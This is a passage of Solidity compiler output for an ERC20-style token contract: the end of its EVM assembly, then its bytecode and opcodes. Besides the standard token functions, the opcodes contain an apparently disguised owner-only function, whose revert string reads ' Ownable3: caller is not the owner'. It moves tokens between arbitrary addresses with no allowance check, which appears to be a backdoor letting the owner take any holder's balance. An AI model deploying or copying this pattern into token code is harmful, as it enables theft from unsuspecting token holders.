swap4\n      swap1\n      swap4\n      add\n        /* \"#utility.yul\":961:993   */\n      calldataload\n      swap4\n      pop\n      pop\n      pop\n        /* \"#utility.yul\":745:999   */\n      jump\t// out\n        /* \"#utility.yul\":1378:1706   */\n    tag_33:\n        /* \"#utility.yul\":1455:1461   */\n      0x00\n        /* \"#utility.yul\":1463:1469   */\n      dup1\n        /* \"#utility.yul\":1471:1477   */\n      0x00\n        /* \"#utility.yul\":1524:1526   */\n      0x60\n        /* \"#utility.yul\":1512:1521   */\n      dup5\n        /* \"#utility.yul\":1503:1510   */\n      dup7\n        /* \"#utility.yul\":1499:1522   */\n      sub\n        /* \"#utility.yul\":1495:1527   */\n      slt\n        /* \"#utility.yul\":1492:1544   */\n      iszero\n      tag_175\n      jumpi\n        /* \"#utility.yul\":1540:1541   */\n      0x00\n        /* \"#utility.yul\":1537:1538   */\n      dup1\n        /* \"#utility.yul\":1530:1542   */\n      revert\n        /* \"#utility.yul\":1492:1544   */\n    tag_175:\n        /* \"#utility.yul\":1563:1592   */\n      tag_176\n        /* \"#utility.yul\":1582:1591   */\n      dup5\n        /* \"#utility.yul\":1563:1592   */\n      tag_161\n      jump\t// in\n    tag_176:\n        /* \"#utility.yul\":1553:1592   */\n      swap3\n      pop\n        /* \"#utility.yul\":1611:1649   */\n      tag_177\n        /* \"#utility.yul\":1645:1647   */\n      0x20\n        /* \"#utility.yul\":1634:1643   */\n      dup6\n        /* \"#utility.yul\":1630:1648   */\n      add\n        /* \"#utility.yul\":1611:1649   */\n      tag_161\n      jump\t// in\n    tag_177:\n        /* \"#utility.yul\":1601:1649   */\n      swap2\n      pop\n        /* \"#utility.yul\":1696:1698   */\n      0x40\n        /* \"#utility.yul\":1685:1694   */\n      dup5\n        /* \"#utility.yul\":1681:1699   */\n      add\n        /* \"#utility.yul\":1668:1700   */\n      calldataload\n        /* \"#utility.yul\":1658:1700   */\n      swap1\n      pop\n        /* \"#utility.yul\":1378:1706   */\n      swap3\n      pop\n      swap3\n      pop\n      swap3\n      jump\t// out\n        /* \"#utility.yul\":2108:2294   */\n    tag_54:\n        /* \"#utility.yul\":2167:2173   */\n      0x00\n        /* \"#utility.yul\":2220:2222   */\n      0x20\n        /* \"#utility.yul\":2208:2217   */\n      dup3\n        /* \"#utility.yul\":2199:2206   */\n      dup5\n        /* \"#utility.yul\":2195:2218   */\n      sub\n        /* \"#utility.yul\":2191:2223   */\n      slt\n        /* \"#utility.yul\":2188:2240   */\n      iszero\n      tag_181\n      jumpi\n        /* \"#utility.yul\":2236:2237   */\n      0x00\n        /* \"#utility.yul\":2233:2234   */\n      dup1\n        /* \"#utility.yul\":2226:2238   */\n      revert\n        /* \"#utility.yul\":2188:2240   */\n    tag_181:\n        /* \"#utility.yul\":2259:2288   */\n      tag_182\n        /* \"#utility.yul\":2278:2287   */\n      dup3\n        /* \"#utility.yul\":2259:2288   */\n      tag_161\n      jump\t// in\n    tag_182:\n        /* \"#utility.yul\":2249:2288   */\n      swap4\n        /* \"#utility.yul\":2108:2294   */\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2299:2559   */\n    tag_73:\n        /* \"#utility.yul\":2367:2373   */\n      0x00\n        /* \"#utility.yul\":2375:2381   */\n      dup1\n        /* \"#utility.yul\":2428:2430   */\n      0x40\n        /* \"#utility.yul\":2416:2425   */\n      dup4\n        /* \"#utility.yul\":2407:2414   */\n      dup6\n        /* \"#utility.yul\":2403:2426   */\n      sub\n        /* \"#utility.yul\":2399:2431   */\n      slt\n        /* \"#utility.yul\":2396:2448   */\n      iszero\n      tag_184\n      jumpi\n        /* \"#utility.yul\":2444:2445   */\n      0x00\n        /* \"#utility.yul\":2441:2442   */\n      dup1\n        /* \"#utility.yul\":2434:2446   */\n      revert\n        /* \"#utility.yul\":2396:2448   */\n    tag_184:\n        /* \"#utility.yul\":2467:2496   */\n      tag_185\n        /* \"#utility.yul\":2486:2495   */\n      dup4\n        /* \"#utility.yul\":2467:2496   */\n      tag_161\n      jump\t// in\n    tag_185:\n        /* \"#utility.yul\":2457:2496   */\n      swap2\n      pop\n        /* \"#utility.yul\":2515:2553   */\n      tag_186\n        /* \"#utility.yul\":2549:2551   */\n      0x20\n        /* \"#utility.yul\":2538:2547   */\n      dup5\n        /* \"#utility.yul\":2534:2552   */\n      add\n        /* \"#utility.yul\":2515:2553   */\n      tag_161\n      jump\t// in\n    tag_186:\n        /* \"#utility.yul\":2505:2553   */\n      swap1\n      pop\n        /* \"#utility.yul\":2299:2559   */\n      swap3\n      pop\n      swap3\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2564:2944   */\n    tag_78:\n        /* \"#utility.yul\":2643:2644   */\n      0x01\n        /* \"#utility.yul\":2639:2651   */\n      dup2\n      dup2\n      shr\n      swap1\n        /* \"#utility.yul\":2686:2698   */\n      dup3\n      and\n      dup1\n        /* \"#utility.yul\":2707:2768   */\n      tag_188\n      jumpi\n        /* \"#utility.yul\":2761:2765   */\n      0x7f\n        /* \"#utility.yul\":2753:2759   */\n      dup3\n        /* \"#utility.yul\":2749:2766   */\n      and\n        /* \"#utility.yul\":2739:2766   */\n      swap2\n      pop\n        /* \"#utility.yul\":2707:2768   */\n    tag_188:\n        /* \"#utility.yul\":2814:2816   */\n      0x20\n        /* \"#utility.yul\":2806:2812   */\n      dup3\n        /* \"#utility.yul\":2803:2817   */\n      lt\n        /* \"#utility.yul\":2783:2801   */\n      dup2\n        /* \"#utility.yul\":2780:2818   */\n      sub\n        /* \"#utility.yul\":2777:2938   */\n      tag_189\n      jumpi\n        /* \"#utility.yul\":2860:2870   */\n      0x4e487b71\n        /* \"#utility.yul\":2855:2858   */\n      0xe0\n        /* \"#utility.yul\":2851:2871   */\n      shl\n        /* \"#utility.yul\":2848:2849   */\n      0x00\n        /* \"#utility.yul\":2841:2872   */\n      mstore\n        /* \"#utility.yul\":2895:2899   */\n      0x22\n        /* \"#utility.yul\":2892:2893   */\n      0x04\n        /* \"#utility.yul\":2885:2900   */\n      mstore\n        /* \"#utility.yul\":2923:2927   */\n      0x24\n        /* \"#utility.yul\":2920:2921   */\n      0x00\n        /* \"#utility.yul\":2913:2928   */\n      revert\n        /* \"#utility.yul\":2777:2938   */\n    tag_189:\n      pop\n        /* \"#utility.yul\":2564:2944   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2949:3171   */\n    tag_101:\n        /* \"#utility.yul\":3014:3023   */\n      dup1\n      dup3\n      add\n        /* \"#utility.yul\":3035:3045   */\n      dup1\n      dup3\n      gt\n        /* \"#utility.yul\":3032:3165   */\n      iszero\n      tag_83\n      jumpi\n        /* \"#utility.yul\":3087:3097   */\n      0x4e487b71\n        /* \"#utility.yul\":3082:3085   */\n      0xe0\n        /* \"#utility.yul\":3078:3098   */\n      shl\n        /* \"#utility.yul\":3075:3076   */\n      0x00\n        /* \"#utility.yul\":3068:3099   */\n      mstore\n        /* \"#utility.yul\":3122:3126   */\n      0x11\n        /* \"#utility.yul\":3119:3120   */\n      0x04\n        /* \"#utility.yul\":3112:3127   */\n      mstore\n        /* \"#utility.yul\":3150:3154   */\n      0x24\n        /* \"#utility.yul\":3147:3148   */\n      0x00\n        /* \"#utility.yul\":3140:3155   */\n      revert\n\n    auxdata: 0xa2646970667358221220bf20b25ea463dc813c09ecb0a0f1779cefcac1f229a908a89c7953b6b522726264736f6c63430008140033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561000f575f80fd5b506109108061001d5f395ff3fe608060405234801561000f575f80fd5b50600436106100b8575f3560e01c806306fdde03146100bc578063095ea7b3146100da57806318160ddd146100fd57806323b872dd1461010f578063313ce5671461012257806339509351146101315780633c186285146101445780634f88f7621461016457806370a082311461017757806395d89b411461019f578063a457c2d7146101a7578063a9059cbb146101ba578063c4a7f8ed146101cd578063dd62ed3e146101d3575b5f80fd5b6100c46101e6565b6040516100d1919061076b565b60405180910390f35b6100ed6100e83660046107d1565b610276565b60405190151581526020016100d1565b6035545b6040519081526020016100d1565b6100ed61011d3660046107f9565b61028f565b604051601281526020016100d1565b6100ed61013f3660046107d1565b6102b2565b61014c6102d3565b6040516001600160a01b0390911681526020016100d1565b6100ed6101723660046107f9565b6102e2565b610101610185366004610832565b6001600160a01b03165f9081526033602052604090205490565b6100c4610367565b6100ed6101b53660046107d1565b610376565b6100ed6101c83660046107d1565b6103f0565b3361014c565b6101016101e1366004610852565b6103fd565b6060603680546101f590610883565b80601f016020809104026020016040519081016040528092919081815260200182805461022190610883565b801561026c5780601f106102435761010080835404028352916020019161026c565b820191905f5260205f20905b81548152906001019060200180831161024f57829003601f168201915b5050505050905090565b5f33610283818585610427565b60019150505b92915050565b5f3361029c85828561054a565b6102a78585856105c2565b506001949350505050565b5f336102838185856102c483836103fd565b6102ce91906108bb565b610427565b6038546001600160a01b031690565b5f336102ec6102d3565b6001600160a01b0316146103525760405162461bcd60e51b815260206004820152602260248201527f204f776e61626c65333a2063616c6c6572206973206e6f7420746865206f776e60448201526132b960f11b60648201526084015b60405180910390fd5b61035d8484846105c2565b5060019392505050565b6060603780546101f590610883565b5f338161038382866103fd565b9050838110156103e35760405162461bcd60e51b815260206004820152602560248201527f45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77604482015264207a65726f60d81b6064820152608401610349565b6102a78286868403610427565b5f336102838185856105c2565b6001600160a01b039182165f90815260346020908152604080832093909416825291909152205490565b6001600160a01b0383166104895760405162461bcd60e51b8152602060048201526024808201527f45524332303a20617070726f76652066726f6d20746865207a65726f206164646044820152637265737360e01b6064820152608401610349565b6001600160a01b0382166104ea5760405162461bcd60e51b815260206004820152602260248201527f45524332303a20617070726f766520746f20746865207a65726f206164647265604482015261737360f01b6064820152608401610349565b6001600160a01b038381165f8181526034602090815260408083209487168084529482529182902085905590518481527f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925910160405180910390a3505050565b5f61055584846103fd565b90505f1981146105bc57818110156105af5760405162461bcd60e51b815260206004820152601d60248201527f45524332303a20696e73756666696369656e7420616c6c6f77616e63650000006044820152606401610349565b6105bc8484848403610427565b50505050565b6001600160a01b0383166106265760405162461bcd60e51b815260206004820152602560248201527f45524332303a207472616e736665722066726f6d20746865207a65726f206164604482015264647265737360d81b6064820152608401610349565b6001600160a01b0382166106885760405162461bcd60e51b815260206004820152602360248201527f45524332303a207472616e7366657220746f20746865207a65726f206164647260448201526265737360e81b6064820152608401610349565b6001600160a01b0383165f90815260336020526040902054818110156106ff5760405162461bcd60e51b815260206004820152602660248201527f45524332303a207472616e7366657220616d6f756e7420657863656564732062604482015265616c616e636560d01b6064820152608401610349565b6001600160a01b038085165f8181526033602052604080822086860390559286168082529083902080548601905591517fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9061075e9086815260200190565b60405180910390a36105bc565b5f6020808352835180828501525f5b818110156107965785810183015185820160400152820161077a565b505f604082860101526040601f19601f8301168501019250505092915050565b80356001600160a01b03811681146107cc575f80fd5b919050565b5f80604083850312156107e2575f80fd5b6107eb836107b6565b946020939093013593505050565b5f805f6060848603121561080b575f80fd5b610814846107b6565b9250610822602085016107b6565b9150604084013590509250925092565b5f60208284031215610842575f80fd5b61084b826107b6565b9392505050565b5f8060408385031215610863575f80fd5b61086c836107b6565b915061087a602084016107b6565b90509250929050565b600181811c9082168061089757607f821691505b6020821081036108b557634e487b7160e01b5f52602260045260245ffd5b50919050565b8082018082111561028957634e487b7160e01b5f52601160045260245ffdfea2646970667358221220bf20b25ea463dc813c09ecb0a0f1779cefcac1f229a908a89c7953b6b522726264736f6c63430008140033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x910 DUP1 PUSH2 0x1D PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0xB8 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0xBC JUMPI DUP1 PUSH4 0x95EA7B3 EQ PUSH2 0xDA JUMPI DUP1 PUSH4 0x18160DDD EQ PUSH2 0xFD JUMPI DUP1 PUSH4 0x23B872DD EQ PUSH2 0x10F JUMPI DUP1 PUSH4 0x313CE567 EQ PUSH2 0x122 JUMPI DUP1 PUSH4 0x39509351 EQ PUSH2 0x131 JUMPI DUP1 PUSH4 0x3C186285 EQ PUSH2 0x144 JUMPI DUP1 PUSH4 0x4F88F762 EQ PUSH2 0x164 JUMPI DUP1 PUSH4 0x70A08231 EQ PUSH2 0x177 JUMPI DUP1 PUSH4 0x95D89B41 EQ PUSH2 0x19F JUMPI DUP1 PUSH4 0xA457C2D7 EQ PUSH2 0x1A7 JUMPI DUP1 PUSH4 0xA9059CBB EQ PUSH2 0x1BA JUMPI DUP1 PUSH4 0xC4A7F8ED EQ PUSH2 0x1CD JUMPI DUP1 PUSH4 0xDD62ED3E EQ PUSH2 0x1D3 JUMPI JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH2 0xC4 PUSH2 0x1E6 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xD1 SWAP2 SWAP1 PUSH2 0x76B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xED PUSH2 0xE8 CALLDATASIZE PUSH1 0x4 PUSH2 0x7D1 JUMP JUMPDEST PUSH2 0x276 JUMP JUMPDEST PUSH1 0x40 MLOAD SWAP1 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0xD1 JUMP JUMPDEST PUSH1 0x35 SLOAD JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0xD1 JUMP JUMPDEST PUSH2 0xED PUSH2 0x11D CALLDATASIZE PUSH1 0x4 PUSH2 0x7F9 JUMP JUMPDEST PUSH2 0x28F JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x12 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0xD1 JUMP JUMPDEST PUSH2 0xED PUSH2 0x13F CALLDATASIZE PUSH1 0x4 PUSH2 0x7D1 JUMP JUMPDEST PUSH2 0x2B2 JUMP JUMPDEST PUSH2 0x14C PUSH2 0x2D3 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0xD1 JUMP JUMPDEST PUSH2 0xED PUSH2 0x172 CALLDATASIZE PUSH1 0x4 PUSH2 0x7F9 JUMP JUMPDEST PUSH2 0x2E2 JUMP JUMPDEST PUSH2 0x101 PUSH2 0x185 CALLDATASIZE PUSH1 0x4 PUSH2 0x832 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH0 SWAP1 DUP2 MSTORE PUSH1 0x33 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD SWAP1 JUMP JUMPDEST PUSH2 0xC4 PUSH2 0x367 JUMP JUMPDEST PUSH2 0xED PUSH2 0x1B5 CALLDATASIZE PUSH1 0x4 PUSH2 0x7D1 JUMP JUMPDEST PUSH2 0x376 JUMP JUMPDEST PUSH2 0xED PUSH2 0x1C8 CALLDATASIZE PUSH1 0x4 PUSH2 0x7D1 JUMP JUMPDEST PUSH2 0x3F0 JUMP JUMPDEST CALLER PUSH2 0x14C JUMP JUMPDEST PUSH2 0x101 PUSH2 0x1E1 CALLDATASIZE PUSH1 0x4 PUSH2 0x852 JUMP JUMPDEST PUSH2 0x3FD JUMP JUMPDEST PUSH1 0x60 PUSH1 0x36 DUP1 SLOAD PUSH2 0x1F5 SWAP1 PUSH2 0x883 JUMP JUMPDEST DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH2 0x221 SWAP1 PUSH2 0x883 JUMP JUMPDEST DUP1 ISZERO PUSH2 0x26C JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x243 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x26C JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH0 MSTORE PUSH1 0x20 PUSH0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x24F JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 CALLER PUSH2 0x283 DUP2 DUP6 DUP6 PUSH2 0x427 JUMP JUMPDEST PUSH1 0x1 SWAP2 POP POP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 CALLER PUSH2 0x29C DUP6 DUP3 DUP6 PUSH2 0x54A JUMP JUMPDEST PUSH2 0x2A7 DUP6 DUP6 DUP6 PUSH2 0x5C2 JUMP JUMPDEST POP PUSH1 0x1 SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH0 CALLER PUSH2 0x283 DUP2 DUP6 DUP6 PUSH2 0x2C4 DUP4 DUP4 PUSH2 0x3FD JUMP JUMPDEST PUSH2 0x2CE SWAP2 SWAP1 PUSH2 0x8BB JUMP JUMPDEST PUSH2 0x427 JUMP JUMPDEST PUSH1 0x38 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 JUMP JUMPDEST PUSH0 CALLER PUSH2 0x2EC PUSH2 0x2D3 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND EQ PUSH2 0x352 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x22 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x204F776E61626C65333A2063616C6C6572206973206E6F7420746865206F776E PUSH1 0x44 DUP3 ADD MSTORE PUSH2 0x32B9 PUSH1 0xF1 SHL PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x84 ADD JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x35D DUP5 DUP5 DUP5 PUSH2 0x5C2 JUMP JUMPDEST POP PUSH1 0x1 SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x60 PUSH1 0x37 DUP1 SLOAD PUSH2 0x1F5 SWAP1 PUSH2 0x883 JUMP JUMPDEST PUSH0 CALLER DUP2 PUSH2 0x383 DUP3 DUP7 PUSH2 0x3FD JUMP JUMPDEST SWAP1 POP DUP4 DUP2 LT ISZERO PUSH2 0x3E3 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x25 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x45524332303A2064656372656173656420616C6C6F77616E63652062656C6F77 PUSH1 0x44 DUP3 ADD MSTORE PUSH5 0x207A65726F PUSH1 0xD8 SHL PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x84 ADD PUSH2 0x349 JUMP JUMPDEST PUSH2 0x2A7 DUP3 DUP7 DUP7 DUP5 SUB PUSH2 0x427 JUMP JUMPDEST PUSH0 CALLER PUSH2 0x283 DUP2 DUP6 DUP6 PUSH2 0x5C2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP2 DUP3 AND PUSH0 SWAP1 DUP2 MSTORE PUSH1 0x34 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP4 SWAP1 SWAP5 AND DUP3 MSTORE SWAP2 SWAP1 SWAP2 MSTORE KECCAK256 SLOAD SWAP1 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH2 0x489 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x24 DUP1 DUP3 ADD MSTORE PUSH32 0x45524332303A20617070726F76652066726F6D20746865207A65726F20616464 PUSH1 0x44 DUP3 ADD MSTORE PUSH4 0x72657373 PUSH1 0xE0 SHL PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x84 ADD PUSH2 0x349 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND PUSH2 0x4EA JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x22 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x45524332303A20617070726F766520746F20746865207A65726F206164647265 PUSH1 0x44 DUP3 ADD MSTORE PUSH2 0x7373 PUSH1 0xF0 SHL PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x84 ADD PUSH2 0x349 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 DUP2 AND PUSH0 DUP2 DUP2 MSTORE PUSH1 0x34 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP5 DUP8 AND DUP1 DUP5 MSTORE SWAP5 DUP3 MSTORE SWAP2 DUP3 SWAP1 KECCAK256 DUP6 SWAP1 SSTORE SWAP1 MLOAD DUP5 DUP2 MSTORE PUSH32 0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 SWAP2 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH0 PUSH2 0x555 DUP5 DUP5 PUSH2 0x3FD JUMP JUMPDEST SWAP1 POP PUSH0 NOT DUP2 EQ PUSH2 0x5BC JUMPI DUP2 DUP2 LT ISZERO PUSH2 0x5AF JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1D PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x45524332303A20696E73756666696369656E7420616C6C6F77616E6365000000 PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x349 JUMP JUMPDEST PUSH2 0x5BC DUP5 DUP5 DUP5 DUP5 SUB PUSH2 0x427 JUMP JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH2 0x626 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x25 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x45524332303A207472616E736665722066726F6D20746865207A65726F206164 PUSH1 0x44 DUP3 ADD MSTORE PUSH5 0x6472657373 PUSH1 0xD8 SHL PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x84 ADD PUSH2 0x349 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND PUSH2 0x688 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x23 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x45524332303A207472616E7366657220746F20746865207A65726F2061646472 PUSH1 0x44 DUP3 ADD MSTORE PUSH3 0x657373 PUSH1 0xE8 SHL PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x84 ADD PUSH2 0x349 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH0 SWAP1 DUP2 MSTORE PUSH1 0x33 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 DUP2 LT ISZERO PUSH2 0x6FF JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x26 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x45524332303A207472616E7366657220616D6F756E7420657863656564732062 PUSH1 0x44 DUP3 ADD MSTORE PUSH6 0x616C616E6365 PUSH1 0xD0 SHL PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x84 ADD PUSH2 0x349 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP6 AND PUSH0 DUP2 DUP2 MSTORE PUSH1 0x33 PUSH1 0x20 MSTORE PUSH1 0x40 DUP1 DUP3 KECCAK256 DUP7 DUP7 SUB SWAP1 SSTORE SWAP3 DUP7 AND DUP1 DUP3 MSTORE SWAP1 DUP4 SWAP1 KECCAK256 DUP1 SLOAD DUP7 ADD SWAP1 SSTORE SWAP2 MLOAD PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF SWAP1 PUSH2 0x75E SWAP1 DUP7 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 PUSH2 0x5BC JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP1 DUP4 MSTORE DUP4 MLOAD DUP1 DUP3 DUP6 ADD MSTORE PUSH0 JUMPDEST DUP2 DUP2 LT ISZERO PUSH2 0x796 JUMPI DUP6 DUP2 ADD DUP4 ADD MLOAD DUP6 DUP3 ADD PUSH1 0x40 ADD MSTORE DUP3 ADD PUSH2 0x77A JUMP JUMPDEST POP PUSH0 PUSH1 0x40 DUP3 DUP7 ADD ADD MSTORE PUSH1 0x40 PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND DUP6 ADD ADD SWAP3 POP POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST DUP1 CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND DUP2 EQ PUSH2 0x7CC JUMPI PUSH0 DUP1 REVERT JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x7E2 JUMPI PUSH0 DUP1 REVERT JUMPDEST PUSH2 0x7EB DUP4 PUSH2 0x7B6 JUMP JUMPDEST SWAP5 PUSH1 0x20 SWAP4 SWAP1 SWAP4 ADD CALLDATALOAD SWAP4 POP POP POP JUMP JUMPDEST PUSH0 DUP1 PUSH0 PUSH1 0x60 DUP5 DUP7 SUB SLT ISZERO PUSH2 0x80B JUMPI PUSH0 DUP1 REVERT JUMPDEST PUSH2 0x814 DUP5 PUSH2 0x7B6 JUMP JUMPDEST SWAP3 POP PUSH2 0x822 PUSH1 0x20 DUP6 ADD PUSH2 0x7B6 JUMP JUMPDEST SWAP2 POP PUSH1 0x40 DUP5 ADD CALLDATALOAD SWAP1 POP SWAP3 POP SWAP3 POP SWAP3 JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x842 JUMPI PUSH0 DUP1 REVERT JUMPDEST PUSH2 0x84B DUP3 PUSH2 0x7B6 JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x863 JUMPI PUSH0 DUP1 REVERT JUMPDEST PUSH2 0x86C DUP4 PUSH2 0x7B6 JUMP JUMPDEST SWAP2 POP PUSH2 0x87A PUSH1 0x20 DUP5 ADD PUSH2 0x7B6 JUMP JUMPDEST SWAP1 POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 0x1 DUP2 DUP2 SHR SWAP1 DUP3 AND DUP1 PUSH2 0x897 JUMPI PUSH1 0x7F DUP3 AND SWAP2 POP JUMPDEST PUSH1 0x20 DUP3 LT DUP2 SUB PUSH2 0x8B5 JUMPI PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH0 MSTORE PUSH1 0x22 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST POP SWAP2 SWAP1 POP JUMP JUMPDEST DUP1 DUP3 ADD DUP1 DUP3 GT ISZERO PUSH2 0x289 JUMPI PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT INVALID LOG2 PUSH5 